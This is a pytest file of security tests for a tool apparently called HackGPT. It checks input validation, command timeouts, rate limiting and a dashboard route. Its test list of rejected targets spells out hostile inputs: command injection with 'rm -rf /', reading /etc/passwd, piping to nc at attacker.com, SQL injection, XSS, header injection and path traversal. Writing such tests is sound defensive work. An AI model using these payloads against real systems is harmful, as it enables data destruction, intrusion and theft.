"""
HackGPT Security Tests
Tests for input validation edge cases, ethical disclaimers,
and security-sensitive code paths.
"""

from unittest.mock import MagicMock, patch

import pytest


class TestInputValidationSecurity:
    """Ensure malicious inputs are properly rejected."""

    MALICIOUS_TARGETS = [
        "example.com; rm -rf /",
        "$(whoami)",
        "`id`",
        "example.com && cat /etc/passwd",
        "127.0.0.1 | nc attacker.com 4444",
        "' OR 1=1 --",
        "<script>alert(1)</script>",
        "example.com\nX-Injected: header",
        "../../../etc/passwd",
    ]

    @pytest.mark.parametrize("target", MALICIOUS_TARGETS)
    def test_rejects_malicious_targets(self, target):
        from hackgpt import InputValidator

        ok, _ = InputValidator.validate_target(target)
        assert ok is False, f"Should have rejected: {target!r}"

    def test_rejects_null_bytes_in_target(self):
        from hackgpt import InputValidator

        ok, _ = InputValidator.validate_target("example\x00.com")
        assert ok is False

    def test_strips_whitespace(self):
        from hackgpt import InputValidator

        ok, result = InputValidator.validate_target("  example.com  ")
        assert ok is True
        assert result == "example.com"


class TestToolManagerSecurity:
    """Verify safe command execution."""

    def test_command_timeout_enforced(self):
        from hackgpt import ToolManager

        tm = ToolManager()
        result = tm.run_command("sleep 30", timeout=1)
        assert result["success"] is False

    def test_stderr_captured_on_failure(self):
        from hackgpt import ToolManager

        tm = ToolManager()
        result = tm.run_command("ls /nonexistent_dir_12345")
        assert result["success"] is False
        assert result["stderr"]  # should have error output


class TestRateLimiterSecurity:
    """Rate limiter must prevent abuse."""

    def test_blocks_rapid_calls(self):
        from hackgpt import RateLimiter

        rl = RateLimiter(max_requests=5, window_seconds=60)
        for _ in range(5):
            rl.allow("flood")
        # 6th call should be blocked
        assert rl.allow("flood") is False

    def test_allows_after_window_expires(self):
        """After the window passes, requests should be allowed again."""
        import time

        from hackgpt import RateLimiter

        rl = RateLimiter(max_requests=1, window_seconds=1)
        rl.allow("key")
        assert rl.allow("key") is False
        time.sleep(1.1)
        assert rl.allow("key") is True


class TestWebDashboardSecurity:
    """Web dashboard should not accept arbitrary payloads."""

    @patch("hackgpt.subprocess.run")
    def test_web_dashboard_has_routes(self, mock_run):
        """WebDashboard should set up /api/status route."""
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
        from hackgpt import HackGPT, WebDashboard

        hgpt = HackGPT()
        wd = WebDashboard(hgpt)
        client = wd.app.test_client()
        resp = client.get("/api/status")
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["status"] == "running"
